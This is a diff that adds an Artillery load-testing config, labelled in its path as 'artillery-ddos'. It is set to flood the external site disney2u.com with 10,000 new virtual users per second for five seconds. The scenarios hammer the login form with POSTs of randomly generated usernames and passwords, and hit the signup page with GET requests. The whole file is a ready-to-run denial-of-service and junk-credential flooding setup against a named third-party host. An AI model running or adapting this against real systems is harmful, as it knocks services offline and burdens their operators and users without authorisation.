@@ -1,0 +1,28 @@
+# artillery run artillery-ddos/disney2u.yml
+config:
+  target: "https://disney2u.com"
+  phases:
+    - duration: 5
+      arrivalRate: 10000
+  processor: "./ngrok.js"
+scenarios:
+  - name: "1"
+    flow:
+      - function: "generateRandomData"
+      - post:
+          url: "/page/p_login"
+          form:
+            txt_username: "{{ name }}"
+            # email: "{{ email }}"
+            txt_password: "{{ password }}"
+      # - log: "Post with {{ name }}, {{ password }}"
+  - name: "2"
+    flow:
+      - function: "generateRandomData"
+      - get:
+          url: "/signup?s={{ name }}"
+          # form:
+            # txt_username: "{{ name }}"
+            # email: "{{ email }}"
+            # txt_password: "{{ password }}"
+      # - log: "Get with {{ name }}"
